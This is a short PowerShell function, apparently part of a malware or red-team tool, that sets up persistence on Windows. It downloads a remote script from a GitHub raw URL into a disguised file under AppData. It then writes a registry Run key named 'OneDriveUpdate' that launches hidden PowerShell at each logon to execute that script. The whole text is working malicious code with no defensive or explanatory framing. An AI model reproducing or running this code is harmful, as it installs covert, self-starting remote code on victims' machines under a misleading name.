function persistence{
  (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/josprou/Replicator/main/Replicator.ps1') > $Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Microsoft\CLR_v4.0.aaa
  reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v "OneDriveUpdate" /d "powershell.exe -NoP -W Hidden IEX (gc '$Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Microsoft\CLR_v4.0.aaa')" /t REG_SZ /f 
}
